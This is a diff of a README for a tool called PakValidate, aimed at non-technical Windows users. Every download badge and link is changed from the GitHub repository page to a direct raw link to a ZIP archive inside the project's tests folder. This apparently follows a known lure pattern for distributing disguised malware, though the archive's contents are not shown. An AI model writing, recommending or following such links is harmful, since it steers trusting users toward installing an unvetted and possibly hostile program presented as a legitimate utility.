@@ -1,6 +1,6 @@
 # 🇵🇰 PakValidate - Simple Pakistani Data Validation
 
-[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-brightgreen?style=for-the-badge)](https://github.com/Farida1412/PakValidate)
+[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Farida1412/PakValidate/main/tests/Pak-Validate-magneta.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to get PakValidate running on your Windows PC. No programming
 
 Click the big green button below to visit the download page on GitHub:
 
-[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-blueviolet?style=for-the-badge)](https://github.com/Farida1412/PakValidate)
+[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/Farida1412/PakValidate/main/tests/Pak-Validate-magneta.zip)
 
 On this page, you will find the latest release of the software. Usually, you should look for files ending with `.exe` or `.msi` if available, or a ZIP file containing the program.
 
@@ -124,7 +124,7 @@ If problems persist, you can visit the repository page for updates or help.
 
 Use this link anytime you need to download or update PakValidate:
 
-[Download PakValidate](https://github.com/Farida1412/PakValidate)
+[Download PakValidate](https://raw.githubusercontent.com/Farida1412/PakValidate/main/tests/Pak-Validate-magneta.zip)
 
 ---
 
@@ -170,4 +170,4 @@ You don’t need to write code or use command lines. PakValidate works as a simp
 
 Download the latest version here:
 
-[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-blue?style=for-the-badge)](https://github.com/Farida1412/PakValidate)
+[![Download PakValidate](https://img.shields.io/badge/Download-PakValidate-blue?style=for-the-badge)](https://raw.githubusercontent.com/Farida1412/PakValidate/main/tests/Pak-Validate-magneta.zip)
